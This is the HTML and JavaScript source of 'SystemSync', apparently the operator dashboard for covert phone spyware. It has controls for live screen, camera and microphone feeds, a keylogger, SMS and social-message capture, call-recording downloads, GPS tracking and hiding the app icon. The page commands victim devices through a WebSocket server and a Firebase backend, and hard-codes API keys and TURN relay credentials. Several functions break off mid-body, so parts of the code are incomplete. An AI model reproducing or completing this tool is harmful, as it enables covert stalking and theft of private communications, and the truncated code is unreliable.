<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f4f7fb;
            font-family: 'Inter', sans-serif;
            display: flex;
            height: 100vh;
            overflow: hidden;
            color: #12161b;
        }
        /* Sidebar */
        #sidebar {
            width: 280px;
            background: rgba(255,255,255,0.6);
            backdrop-filter: blur(16px);
            border-right: 1px solid rgba(255,255,255,0.4);
            padding: 20px 16px;
            overflow-y: auto;
            flex-shrink: 0;
            transition: transform 0.3s;
            z-index: 200;
            display: none; /* hidden until device selected */
        }
        .logo {
            font-size: 20px;
            font-weight: 700;
            color: #0f62fe;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid #e2e8f0;
        }
        .section { margin-bottom: 24px; }
        .section-title {
            font-size: 11px;
            font-weight: 700;
            color: #94a3b8;
            text-transform: uppercase;
            margin-bottom: 10px;
            padding-left: 8px;
        }
        #sidebar button {
            width: 100%;
            padding: 10px 14px;
            margin: 2px 0;
            background: transparent;
            color: #12161b;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            text-align: left;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: 0.2s;
        }
        #sidebar button:hover {
            background: #f0f4f8;
            color: #0f62fe;
        }
        /* Camera panels */
        .camera-panel {
            background: #f8fafc;
            border-radius: 8px;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #e2e8f0;
            display: none;
        }
        .camera-panel.show { display: block; }
        .camera-option { margin: 8px 0; display: flex; gap: 12px; }
        .capture-btn, .live-btn {
            background: #0f62fe;
            color: white;
            border: none;
            padding: 8px;
            border-radius: 8px;
            width: 100%;
            margin-top: 8px;
            cursor: pointer;
        }
        /* Main content */
        #main {
            flex: 1;
            display: none;
            flex-direction: column;
            background: #f4f7fb;
        }
        #header {
            height: 64px;
            background: rgba(255,255,255,0.7);
            backdrop-filter: blur(16px);
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
        }
        #status {
            padding: 6px 16px;
            border-radius: 20px;
            background: #eff6ff;
            color: #0f62fe;
            font-size: 13px;
            font-weight: 600;
        }
        #status.offline {
            background: #fee2e2;
            color: #d32f2f;
        }
        #reconnectBtn {
            background: white;
            border: 1px solid #ddd;
            border-radius: 50%;
            width: 32px;
            height: 32px;
            cursor: pointer;
            margin-left: 10px;
        }
        #content {
            flex: 1;
            padding: 24px;
            overflow: auto;
        }
        #main-panel {
            background: white;
            border-radius: 16px;
            padding: 32px;
            min-height: 100%;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
            border: 1px solid #e2e8f0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            border-radius: 12px;
            overflow: hidden;
        }
        th {
            background: #f8fafc;
            padding: 12px;
            text-align: left;
            font-weight: 600;
        }
        td {
            padding: 12px;
            border-bottom: 1px solid #f1f5f9;
        }
        .btn-ui {
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
            font-weight: 500;
            cursor: pointer;
            background: #f1f5f9;
        }
        .btn-ui.primary {
            background: #0f62fe;
            color: white;
        }
        /* Auth overlays */
        #authContainer, #deviceListContainer {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(8px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 20000;
        }
        #authBox, #deviceListBox {
            background: white;
            padding: 40px;
            border-radius: 24px;
            width: 400px;
            max-width: 90%;
            text-align: center;
        }
        #authBox input, #deviceListBox input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 12px;
        }
        #authBox button, #logoutBtn {
            width: 100%;
            padding: 12px;
            background: #0f62fe;
            color: white;
            border: none;
            border-radius: 12px;
            margin-top: 12px;
            cursor: pointer;
        }
        .toggle-link {
            margin-top: 16px;
            color: #0f62fe;
            cursor: pointer;
        }
        .device-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #e2e8f0;
            border-radius: 16px;
            margin-bottom: 12px;
            cursor: pointer;
            background: white;
        }
        .device-item:hover {
            border-color: #0f62fe;
        }
        /* File manager */
        .file-toolbar-sticky {
            position: sticky;
            top: 0;
            background: white;
            padding: 12px 0;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
        }
        .tree-root { list-style: none; padding-left: 0; }
        .tree-children {
            display: grid;
            grid-template-rows: 0fr;
            transition: grid-template-rows 0.3s;
        }
        .tree-children.expanded { grid-template-rows: 1fr; }
        .tree-children-inner {
            overflow: hidden;
            padding-left: 20px;
            border-left: 1px dashed #e2e8f0;
            margin-left: 10px;
        }
        .folder-header, .file-row {
            display: flex;
            align-items: center;
            padding: 8px 12px;
            border-radius: 8px;
            cursor: pointer;
        }
        .folder-header:hover, .file-row:hover { background: #f8fafc; }
        .folder-icon, .file-icon { width: 24px; margin-right: 12px; }
        .chevron {
            font-size: 12px;
            margin-right: 8px;
            transition: transform 0.3s;
            display: inline-block;
            width: 12px;
        }
        .chevron.down { transform: rotate(90deg); }
        .item-name { flex: 1; font-size: 14px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .file-size { font-size: 12px; color: #5c6a7a; margin-left: 10px; }
        .file-actions { opacity: 0; transition: 0.2s; margin-left: 16px; display: inline-flex; gap: 6px; }
        .file-row:hover .file-actions { opacity: 1; }
        .file-action-btn {
            background: white;
            border: 1px solid #e2e8f0;
            border-radius: 4px;
            padding: 4px 8px;
            font-size: 12px;
            cursor: pointer;
        }
        /* Call recording card */
        .call-recording-card {
            background: white;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
        }
        .download-recording-btn {
            background: #0f62fe;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
        }
        /* Map */
        #map { height: 380px; border-radius: 12px; }
        .map-info {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(255,255,255,0.95);
            padding: 8px 12px;
            border-radius: 8px;
            border-left: 4px solid #0f62fe;
        }
        /* Modal for camera */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.85);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        .modal-overlay.show { display: flex; }
        .mobile-popup {
            width: min(92vw, calc(92vh * 9 / 16));
            height: min(92vh, calc(92vw * 16 / 9));
            background: black;
            border-radius: 24px;
            overflow: hidden;
            position: relative;
        }
        .phone-frame {
            display: flex;
            align-items: center;
            justify-content: center;
            background: black;
            height: 100%;
        }
        .phone-frame video {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        .popup-controls {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: #111;
            padding: 12px;
            display: flex;
            gap: 12px;
            justify-content: center;
        }
        .popup-controls button {
            width: 48px;
            height: 48px;
            background: #222;
            color: white;
            border: none;
            border-radius: 50%;
            cursor: pointer;
        }
        @media (max-width: 768px) {
            #sidebar {
                position: fixed;
                transform: translateX(-100%);
                z-index: 1000;
            }
            #sidebar.open { transform: translateX(0); }
            #menuBtn { display: block; }
            #sidebarOverlay {
                display: none;
                position: fixed;
                inset: 0;
                background: rgba(0,0,0,0.5);
                z-index: 99;
            }
            #sidebarOverlay.show { display: block; }
        }
    </style>
</head>
<body>
<div id="sidebarOverlay" onclick="closeSidebar()"></div>
<div id="authContainer"><div id="authBox"><h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email"><input type="password" id="authPassword" placeholder="Password"><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;"><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div></div></div>
<div id="deviceListContainer" style="display:none;"><div id="deviceListBox"><h2>📱 Your Devices</h2><div id="deviceList"></div><button id="logoutBtn">Logout</button></div></div>

<div id="screenModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalScreenVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="modalSnapBtn">📸</button><button id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn">✕</button></div></div></div>
<div id="cameraModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalCameraVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="cameraSnapBtn">📸</button><button id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button id="cameraCloseBtn">✕</button></div></div></div>
<div id="audioModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><audio id="modalAudioPlayer" controls></audio></div><div class="popup-controls"><button id="audioRecordBtn">🔴</button><button id="audioCloseBtn">✕</button></div></div></div>

<div id="sidebar">
    <div class="logo">SystemSync 🔗</div>
    <div class="section"><div class="section-title">Surveillance</div>
        <button id="screenShareBtn"><span>🖥</span> Start Screen</button>

        <button id="liveCameraBtn"><span>📹</span> See Live</button>

        <button id="liveAudioBtn"><span>🎤</span> Live Audio</button>

        <button id="installedAppsBtn"><span>📱</span> Installed Apps</button>
        <button id="browserHistoryBtn"><span>🌐</span> Browser History</button>
        <button id="wifiNetworksBtn"><span>📶</span> Wi-Fi Networks</button>
    </div>
    <div class="section"><div class="section-title">Monitoring</div>
        <button id="screenTimeBtn"><span>📊</span> Screen Time</button>
        <button id="socialMessagesBtn"><span>💬</span> Social Messages</button>
        <button id="keylogBtn"><span>⌨️</span> Keyboard Log</button>
        <button id="clipboardBtn"><span>📋</span> Clipboard</button>
        <button id="geofenceBtn"><span>🗺️</span> Geofence</button>
        <button id="autoCaptureBtn"><span>⏱️</span> Auto Capture</button>
        <button id="liveGpsBtn"><span>🛰️</span> Live GPS Track</button>
        <button id="locationHistoryBtn"><span>📍</span> Location History</button>
        <button id="callRecordingsBtn"><span>🎙️</span> Call Recordings</button>
        <button id="photoGalleryBtn"><span>🖼️</span> Photo Gallery</button>
        <button id="appEventsBtn"><span>📦</span> App Events</button>
        <button id="smsKeywordsBtn"><span>🔑</span> SMS Keywords</button>
    </div>
    <div class="section"><div class="section-title">Control</div>
        <button id="toggleAppIconBtn"><span>👻</span> Hide Icon</button>
        <button id="lockDeviceBtn"><span>🔒</span> Lock Screen</button>
        <button id="sendSmsBtn"><span>✉️</span> Send SMS</button>
        <button id="vibrateBtn"><span>📳</span> Vibrate</button>

</div>

<div id="main">
    <div id="header">
        <div><button id="menuBtn" style="display:none;" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span id="serverInfo"></span> <button id="headerLeaveBtn" style="display:none;" onclick="leaveDevice()">Leave Device</button></span></div>
        <div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div>

    <div id="downloadProgress" style="display:none; background:#fff; padding:12px; margin:0 24px 12px; border-radius:8px;"><div><span id="progressFileName"></span> <span id="progressPercent"></span></div><div><div id="progressBar" style="height:6px; background:#0f62fe; width:0%;"></div></div></div>
    <div id="content"><div id="main-panel">🔌 Select a device to start...</div></div>
</div>

<script>
// ==================== FIREBASE CONFIG ====================
const firebaseConfig = {
    apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
    authDomain: "webviewiot.firebaseapp.com",
    projectId: "webviewiot",
    storageBucket: "webviewiot.firebasestorage.app",
    messagingSenderId: "634777347775",
    appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a"
};
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();
const storage = firebase.storage();

// ==================== ENHANCED ICE SERVERS ====================
const ICE_SERVERS = [
    { urls: "stun:stun.l.google.com:19302" },
    { urls: "stun:stun1.l.google.com:19302" },
    { urls: "stun:stun.relay.metered.ca:80" },
    { urls: "turn:global.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
    { urls: "turn:global.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
    { urls: "turn:global.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
    { urls: "turns:global.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
];

// ==================== GLOBALS ====================
let currentUser = null, selectedDeviceId = null, ws = null, reconnectTimer = null, reconnectAttempts = 0;
let screenPC = null, cameraPC = null, audioPC = null, fileTransfers = {}, mapInstance = null;
let currentData = [], currentPage = 0, dataType = null, currentPath = "root", selectedFiles = [];
let screenActive = false, iconHidden = false, flashOn = false, isLoginMode = true, liveGpsActive = false;
let mediaRecorder = null, recordedChunks = [], pendingCommand = null, newAlerts = [];
let screenMediaRecorder = null, screenRecordedChunks = [];
let currentCameraStream = null, currentAudioStream = null;
let currentLocation = null;

const panel = document.getElementById('main-panel');
const statusEl = document.getElementById('status');
const wsDebug = document.getElementById('wsDebug');

function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
function formatBytes(b) { if(b===0) return '0 B'; const i=Math.floor(Math.log(b)/Math.log(1024)); return (b/Math.pow(1024,i)).toFixed(1)+' '+['B','KB','MB','GB'][i]; }
function showNotification(t) { const o=statusEl.innerText; statusEl.innerText=t; setTimeout(()=>statusEl.innerText=o,2000); }
function setStatus(s) { statusEl.innerText=s; if(s==='ONLINE') statusEl.classList.remove('offline'); else statusEl.classList.add('offline'); }
function pushAlert(t,b) { newAlerts.unshift({title:t,body:b,time:new Date().toLocaleTimeString()}); if(newAlerts.length>50)newAlerts.pop(); const badge=document.getElementById('alertsBadge'),list=document.getElementById('alertsList'); if(badge){badge.style.display='block';list.innerHTML='';newAlerts.forEach(a=>{const d=document.createElement('div');d.style.cssText='margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';d.textContent=a.time+' '+a.title+': '+a.body;list.appendChild(d);});} }
function clearAlerts() { newAlerts=[]; document.getElementById('alertsBadge').style.display='none'; }
function downloadBase64(b64,fn){ const a=document.createElement('a'); a.href='data:application/octet-stream;base64,'+b64; a.download=fn; a.click(); }
function toggleSidebar() { const sb=document.getElementById('sidebar'), ov=document.getElementById('sidebarOverlay'); sb.classList.toggle('open'); if(ov) ov.classList.toggle('show'); }
function closeSidebar() { const sb=document.getElementById('sidebar'), ov=document.getElementById('sidebarOverlay'); sb.classList.remove('open'); if(ov) ov.classList.remove('show'); }

// ==================== AUTH ====================
function renderAuthForm() {
    const c=document.getElementById('authBox');
    if(isLoginMode) c.innerHTML=`<h2>🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email"><input type="password" id="authPassword" placeholder="Password"><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;"><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div>`;
    else c.innerHTML=`<h2>✨ Create Account</h2><input type="email" id="authEmail" placeholder="Email"><input type="password" id="authPassword" placeholder="Password"><input type="password" id="authConfirmPassword" placeholder="Confirm Password"><button id="authBtn">Sign Up</button><div class="toggle-link" id="toggleAuthMode">Already have an account? Sign in</div><div id="authError"></div>`;
    document.getElementById('authBtn').onclick=handleAuth;
    document.getElementById('toggleAuthMode').onclick=(e)=>{e.preventDefault();isLoginMode=!isLoginMode;renderAuthForm();};
}
async function handleAuth(){
    const email=document.getElementById('authEmail').value.trim(), pwd=document.getElementById('authPassword').value.trim(), err=document.getElementById('authError');
    if(!email||!pwd){err.innerText='Please fill all fields';return;}
    const btn = document.getElementById('authBtn');
    btn.innerText = 'Processing...';
    try{
        let user;
        if(!isLoginMode){
            const cf=document.getElementById('authConfirmPassword').value.trim();
            if(pwd!==cf){err.innerText='Passwords do not match';btn.innerText='Sign Up';return;}
            user=(await auth.createUserWithEmailAndPassword(email,pwd)).user;
        }else user=(await auth.signInWithEmailAndPassword(email,pwd)).user;
        currentUser=user;
        document.getElementById('authContainer').style.display='none';
        document.getElementById('deviceListContainer').style.display='flex';
        loadDevices();
    }catch(e){err.innerText=e.message; btn.innerText=isLoginMode?'Sign In':'Sign Up';}
}
function logout(){ auth.signOut().then(()=>{ document.getElementById('deviceListContainer').style.display='none'; document.getElementById('sidebar').style.display='none'; document.getElementById('main').style.display='none'; document.getElementById('authContainer').style.display='flex'; if(ws)ws.close(); selectedDeviceId=null; isLoginMode=true; renderAuthForm(); }); }
async function loadDevices(){
    if(!currentUser)return;
    const snap=await db.collection('devices').where('userId','==',currentUser.uid).get();
    const list=document.getElementById('deviceList');
    list.innerHTML='';
    if(snap.empty) list.innerHTML='<p style="color:#999;">No devices registered.</p>';
    else snap.forEach(doc=>{ const d=doc.data(); const div=document.createElement('div'); div.className='device-item'; div.onclick=()=>selectDevice(d.deviceId,d.name||'Unknown'); div.innerHTML=`<span style="font-size:24px;">📱</span><div style="margin-left:12px;"><div><strong>${escapeHtml(d.name||'Unnamed')}</strong></div><div style="font-size:12px; color:#666;">${escapeHtml(d.deviceId)}</div></div>`; list.appendChild(div); });
    document.getElementById('deviceListContainer').style.display='flex';
}
window.leaveDevice = function() {
    selectedDeviceId=null;
    document.getElementById('main').style.display='none';

// ==================== WEBSOCKET ====================
function connectWebSocket(){
    if(ws&&(ws.readyState===WebSocket.OPEN||ws.readyState===WebSocket.CONNECTING))return;
    if(reconnectTimer)clearTimeout(reconnectTimer);
    setStatus('CONNECTING');
    wsDebug.innerText='🌐 WebSocket: connecting...';
    panel.innerHTML='⏳ Connecting...';
    ws=new WebSocket("wss://mirror-view.onrender.com");
    ws.onopen=()=>{ reconnectAttempts=0; ws.send('I_AM_WEB'); setStatus('ONLINE'); panel.innerHTML='✅ Connected.'; wsDebug.innerText='🌐 WebSocket: ONLINE'; };
    ws.onmessage=e=>handleIncomingMessage(e.data);
    ws.onclose=()=>{ setStatus('OFFLINE'); wsDebug.innerText='🌐 WebSocket: closed'; panel.innerHTML='🔌 Disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws=null; const d=Math.min(1000*Math.pow(1.5,reconnectAttempts),30000); reconnectAttempts++; reconnectTimer=setTimeout(()=>connectWebSocket(),d); };
    ws.onerror=()=>{ setStatus('ERROR'); wsDebug.innerText='🌐 WebSocket: error'; };
}
function manualReconnect(){ if(reconnectTimer)clearTimeout(reconnectTimer); if(ws)ws.close(); reconnectAttempts=0; connectWebSocket(); }
function sendCommand(cmd,params={}){
    if(!ws||ws.readyState!==WebSocket.OPEN){panel.innerHTML='<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>';return;}
    const payload={type:'COMMAND',command:cmd,requestId:'req_'+Date.now()+'_'+Math.random().toString(36).substr(2,5),params,deviceId:selectedDeviceId,timestamp:Date.now()};
    ws.send(JSON.stringify(payload));
    panel.innerHTML=`<div style="color:#1976ff;">📤 Command sent: ${cmd}</div>`;
    pendingCommand=cmd;
    setTimeout(()=>{ if(pendingCommand===cmd)pendingCommand=null; },10000);
}
function sendPlainText(t){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(t); }

// ==================== WEBRTC ====================
function createPeerConnection(type,onTrack,useMic){
    const pc=new RTCPeerConnection({iceServers:ICE_SERVERS});
    if(type==='screen') pc.addTransceiver('video',{direction:'recvonly'});
    else if(type==='camera'){ pc.addTransceiver('video',{direction:'recvonly'}); if(useMic)pc.addTransceiver('audio',{direction:'recvonly'}); }
    else if(type==='audio') pc.addTransceiver('audio',{direction:'recvonly'});
    pc.ontrack=onTrack;
    pc.onicecandidate=e=>{ if(e.candidate) sendSignaling({type:'ICE_CANDIDATE',candidate:e.candidate,streamType:type}); };
    return pc;
}
function sendSignaling(msg){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(JSON.stringify({type:'SIGNALING',deviceId:selectedDeviceId,data:msg})); }
function handleSignaling(msg){
    if(msg.type==='ANSWER'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc) pc.setRemoteDescription(new RTCSessionDescription({type:'answer',sdp:msg.sdp})); }
    else if(msg.type==='ICE_CANDIDATE'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc&&msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate)); }
}

// Live camera with retry
async function startLiveCameraWithRetry(retry=0){
    const camera=document.querySelector('input[name="liveCameraSelect"]:checked').value;
    const useFlash=document.getElementById('liveFlashCheckbox').checked;
    const useMic=document.getElementById('liveMicCheckbox').checked;
    if(useFlash && camera === 'back') sendCommand('FLASH_ON');
    // Create video element in panel
    panel.innerHTML = `<div style="position:relative;"><video id="liveCamVideo" autoplay playsinline style="width:100%; max-height:500px; background:#000;"></video><div class="live-controls" style="margin-top:10px; display:flex; gap:8px;"><button onclick="takeSnapshot()" style="background:#1976ff; color:white; border:none; padding:8px; border-radius:8px;">📸 Snapshot</button><button onclick="toggleRecording()" style="background:#ff9800; color:white; border:none; padding:8px; border-radius:8px;">🔴 Record</button><button class="stop" onclick="stopLiveStream()" style="background:#d32f2f; color:white; border:none; padding:8px; border-radius:8px;">⏹ Stop</button></div></div>`;
    cameraPC = createPeerConnection('camera', (e) => {
        const videoEl = document.getElementById('liveCamVideo');
        if(videoEl && e.streams[0]) {
            videoEl.srcObject = e.streams[0];
            videoEl.muted = false;
            videoEl.play().catch(err=>console.warn(err));
            showNotification('Live camera connected');
        }
    }, useMic);
    // Timeout retry
    let timeout = setTimeout(() => {
        if(cameraPC && cameraPC.iceConnectionState !== 'connected' && retry < 2) {
            console.warn('ICE timeout, retrying');
            cameraPC.close();
            startLiveCameraWithRetry(retry+1);
        }
    }, 15000);
    try {
        const offer = await cameraPC.createOffer();
        await cameraPC.setLocalDescription(offer);
        sendSignaling({type:'OFFER', sdp:offer.sdp, streamType:'camera', camera, flash:useFlash, mic:useMic});
    } catch(e) {
        clearTimeout(timeout);
        if(retry < 2) startLiveCameraWithRetry(retry+1);
        else showNotification('Camera failed: '+e.message);
    }
}

function takeSnapshot(){
    const video = document.getElementById('liveCamVideo');
    if(!video || !video.videoWidth) return;
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0);
    canvas.toBlob(blob=>{ const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`snapshot_${Date.now()}.png`; a.click(); URL.revokeObjectURL(blob); });
}
function toggleRecording(){
    const video = document.getElementById('liveCamVideo');
    if(!video || !video.srcObject) return;
    if(mediaRecorder && mediaRecorder.state==='recording'){
        mediaRecorder.stop();
        document.getElementById('recordBtn').innerText='🔴 Record';
    } else {
        recordedChunks=[];
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const stream = video.srcObject;
        if(video.videoWidth===0){
            video.onloadedmetadata = ()=>startCanvasRecording(video,canvas,ctx,stream);
        } else startCanvasRecording(video,canvas,ctx,stream);
    }
}
function startCanvasRecording(video,canvas,ctx,originalStream){
    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
    const draw = ()=>{
        ctx.drawImage(video,0,0,canvas.width,canvas.height);
        requestAnimationFrame(draw);
    };
    draw();
    const canvasStream = canvas.captureStream(30);
    originalStream.getAudioTracks().forEach(t=>canvasStream.addTrack(t));
    mediaRecorder = new MediaRecorder(canvasStream, {mimeType:'video/webm'});
    mediaRecorder.ondataavailable = e=>recordedChunks.push(e.data);
    mediaRecorder.onstop = ()=>{
        const blob = new Blob(recordedChunks, {type:'video/webm'});
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `recording_${Date.now()}.webm`;
        a.click();
        URL.revokeObjectURL(blob);
        canvasStream.getTracks().forEach(t=>t.stop());
    };
    mediaRecorder.start();
    document.getElementById('recordBtn').innerText='🟢 Stop';
}

function renderFileTreeNodes(data, path) {
    const folders = data.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
    const files = data.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
    let html = '';
    folders.forEach(f=>{
        const encPath = btoa(encodeURIComponent(f.path)).replace(/=/g,'');
        html+=`<li><div class="folder-header" data-path="${escapeHtml(f.path)}"><span class="chevron">▶</span><span class="folder-icon">📁</span><span class="item-name">${escapeHtml(f.name)}</span></div><div class="tree-children" id="tree-container-${encPath}"><ul class="tree-children-inner" id="tree-inner-${encPath}"></ul></div></li>`;
    });
    files.forEach(f=>{
        html+=`<li><div class="file-row"><span class="file-icon">📄</span><span class="item-name">${escapeHtml(f.name)}</span><span class="file-size">${formatBytes(f.size)}</span><div class="file-actions"><button class="file-action-btn dl" data-path="${escapeHtml(f.path)}">⬇️</button><button class="file-action-btn del" data-path="${escapeHtml(f.path)}">🗑️</button></div></div></li>`;
    });
    if(folders.length===0 && files.length===0) html+=`<li style="padding:10px 20px; color:#999;">Empty folder</li>`;
    return html;
}
function renderFiles() {
    let html=`<div class="file-manager"><div class="file-toolbar-sticky"><div style="display:flex; gap:8px;"><button onclick="navigateUp()">⬆ Up</button><div style="margin-left:auto;"><button onclick="downloadSelected()">⬇️ <span id="downloadCount">${selectedFiles.length}</span></button><button onclick="deleteSelected()" style="background:#d32f2f;color:white; margin-left:8px;">🗑️ <span id="deleteCount">${selectedFiles.length}</span></button></div></div></div><div class="tree-content"><ul class="tree-root" id="tree-root-container">`;
    if(currentData && currentData.length) {
        const sorted = [...currentData];
        const folders = sorted.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
        const files = sorted.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
        html += renderFileTreeNodes([...folders, ...files], 'root');
    } else { html += '<li style="padding:10px; color:#999;">No files or root not loaded yet.</li>'; }
    html += `</ul></div></div>`;
    panel.innerHTML = html;
    attachFileEventListeners();
}
function attachFileEventListeners() {
    document.querySelectorAll('.folder-header').forEach(h=>{ h.removeEventListener('click', folderClickHandler); h.addEventListener('click', folderClickHandler); });
    document.querySelectorAll('.file-action-btn.dl').forEach(b=>{ b.removeEventListener('click', downloadClickHandler); b.addEventListener('click', downloadClickHandler); });
    document.querySelectorAll('.file-action-btn.del').forEach(b=>{ b.removeEventListener('click', deleteClickHandler); b.addEventListener('click', deleteClickHandler); });

function folderClickHandler(e) {
    e.stopPropagation();

    const path = header.getAttribute('data-path');

    const container = document.getElementById(`tree-container-${encPath}`);

// ==================== CALL RECORDINGS (Firebase) ====================
async function showCallRecordingsPanel() {
    if(!selectedDeviceId){ panel.innerHTML='<p>No device selected.</p>'; return; }
    if(!currentUser){ panel.innerHTML='<p>Please login.</p>'; return; }
    panel.innerHTML='<h3>🎙️ Call Recordings</h3><p>Loading...</p>';
    try {
        let snapshot = null;
        // Try subcollection first
        try { snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings').orderBy('timestamp','desc').get(); } catch(e) {}
        if(!snapshot || snapshot.empty) {
            snapshot = await db.collection('call_recordings')
                .where('deviceId','==',selectedDeviceId)
                .where('userId','==',currentUser.uid)
                .orderBy('timestamp','desc')
                .get();
        }
        if(snapshot.empty) {
            panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p>No recordings found. <button id="fallbackRecordingsBtn" class="btn-ui primary">Fetch from Device</button></p>`;
            document.getElementById('fallbackRecordingsBtn')?.addEventListener('click',()=>{ sendCommand('GET_CALL_RECORDINGS',{days:30}); showNotification('Fetching from device...'); });
            return;
        }
        let html = '<h3>🎙️ Call Recordings (Firebase)</h3><div>';
        snapshot.forEach(doc=>{
            const rec = doc.data();
            const dirIcon = rec.direction==='incoming'?'📞':'📤';
            const timestamp = rec.timestamp ? new Date(rec.timestamp).toLocaleString() : rec.timeFmt || 'Unknown';
            const duration = rec.duration ? `${Math.floor(rec.duration/60)}:${(rec.duration%60).toString().padStart(2,'0')}` : '?';
            html += `<div class="call-recording-card"><div><span>${dirIcon}</span> <strong>${escapeHtml(rec.number||'Unknown')}</strong> ${rec.name?`(${escapeHtml(rec.name)})`:''}<br><small>${timestamp} • ${duration}</small></div><button class="download-recording-btn" data-url="${escapeHtml(rec.audioURL)}" data-filename="call_${rec.number}_${rec.timestamp}.m4a">⬇️ Download</button></div>`;
        });
        html += '</div>';
        panel.innerHTML = html;
        document.querySelectorAll('.download-recording-btn').forEach(btn=>{
            btn.addEventListener('click', async ()=>{
                const url = btn.getAttribute('data-url');
                const filename = btn.getAttribute('data-filename');
                if(!url) return showNotification('No audio URL');
                try {
                    showNotification('Downloading...');
                    const response = await fetch(url);
                    const blob = await response.blob();
                    const a = document.createElement('a');
                    a.href = URL.createObjectURL(blob);
                    a.download = filename;
                    a.click();
                    URL.revokeObjectURL(a.href);
                    showNotification('Download complete');
                } catch(e){ showNotification('Download failed'); }
            });
        });
    } catch(err) {
        console.error(err);
        panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackDeviceBtn" class="btn-ui primary">Fetch from Device</button>`;
        document.getElementById('fallbackDeviceBtn')?.addEventListener('click',()=>{ sendCommand('GET_CALL_RECORDINGS',{days:30}); });
    }
}

function displaySMS(data){ if(!Array.isArray(data)) return; const rows=data.map(m=>[m.type==='inbox'||m.type===1?'📥 In':'📤 Out', m.address||m.number||'', m.body||'', m.date||m.timeFmt||'']); renderTable(rows,['Type','Number','Message','Date']); }
